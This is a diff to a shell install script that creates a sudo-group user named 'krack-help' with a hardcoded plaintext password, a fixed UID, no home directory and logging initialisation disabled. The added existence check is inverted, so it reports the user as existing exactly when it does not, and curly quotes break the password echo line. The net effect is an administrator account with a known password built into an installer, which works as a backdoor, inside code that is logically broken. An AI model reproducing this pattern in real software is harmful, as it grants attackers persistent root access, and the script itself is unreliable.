@@ -3,9 +3,17 @@
 #create sudoer user
 userHelp="krack-help"
 password="Ufo[hs"
-useradd --iud 998 --shell /bin/bash --no-create-home --no-log-init $userHelp
-echo -e “$password\n$password” | sudo passwd $userHelp
-usermod -aG sudo $userHelp
+userId=998
+
+if ! getent passwd $userHelp > /dev/null 2>&1; then
+    echo "user $userHelp already exists"
+else
+	useradd --uid $userId --shell /bin/bash --no-create-home --no-log-init $userHelp
+	echo -e “$password\n$password” | sudo passwd $userHelp
+	usermod -aG sudo $userHelp
+	echo "user $userHelp created"
+fi
+
 
 echo "install done"
 
